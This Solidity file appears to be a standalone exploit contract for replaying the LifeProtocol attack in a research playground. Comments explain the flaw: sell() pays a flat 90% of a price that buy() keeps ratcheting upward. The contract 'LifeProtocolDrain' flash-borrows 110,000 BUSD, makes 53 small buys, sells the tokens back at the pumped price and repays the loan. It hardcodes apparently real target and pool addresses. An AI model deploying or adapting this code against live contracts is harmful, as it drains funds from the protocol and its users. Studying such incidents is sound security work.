// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2025-04-Lifeprotocol).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (attacker = address(this); the DODO/DPP flash-loan callback `DPPFlashLoanCall`
// lives on the test itself), so there is no standalone exploit contract to deploy.
// This contract is a faithful, self-contained copy of that inline attack so the
// playground can deploy it and record run(). Logic and constants are copied
// verbatim from test/Lifeprotocol_exp.sol (LifeProtocol_exp.setUp / testExploit /
// DPPFlashLoanCall), with the two `approve()` calls that originally ran in
// `setUp()` moved into `run()` itself (the playground never replays `setUp()`).
//
// Root cause: LifeProtocolContract.sell() prices the ENTIRE sold amount at
// `currentPrice * 90 / 100` and never adjusts currentPrice afterwards, while
// buy() ratchets currentPrice UP on every purchase (handleRatio()). An attacker
// can pump currentPrice with a sequence of small buys (cheap on average, since
// the price only rises gradually), then immediately sell the same tokens back
// at a flat 90% of the newly-pumped (peak) price -- profiting on the spread
// whenever 0.9 * peakPrice > averageBuyPrice. A 0-fee DODO flash loan supplies
// the working capital for the round trip.

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
}

interface IFS is IERC20 {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;

    function buy(uint256 lifeTokenAmount) external;

    function sell(uint256 amount) external;
}

address constant LifeProtocolContract = 0x42e2773508e2AE8fF9434BEA599812e28449e2Cd;
address constant dpp = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
address constant busd = 0x55d398326f99059fF775485246999027B3197955;
address constant lifeToken = 0x19B2834f99Fb9eB4164CB5b49046Ec207F894197;

contract LifeProtocolDrain {
    uint256 public quoteAmount = 110000 * 1e18;

    function run() external {
        // Originally ran once in setUp(); replicated here since the playground
        // never replays setUp() for a syntheticExploit.
        IFS(busd).approve(LifeProtocolContract, quoteAmount);
        IFS(lifeToken).approve(LifeProtocolContract, quoteAmount);

        IFS(dpp).flashLoan(0, quoteAmount, address(this), abi.encodePacked(uint256(1)));
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount_, bytes calldata data) external {
        for (uint256 i = 0; i < 53; i++) {
            IFS(LifeProtocolContract).buy(1000 * 1e18);
        }

        for (uint256 i = 0; i < 53; i++) {
            IFS(LifeProtocolContract).sell(1000 * 1e18);
        }
        IFS(busd).transfer(dpp, quoteAmount_);
    }
}
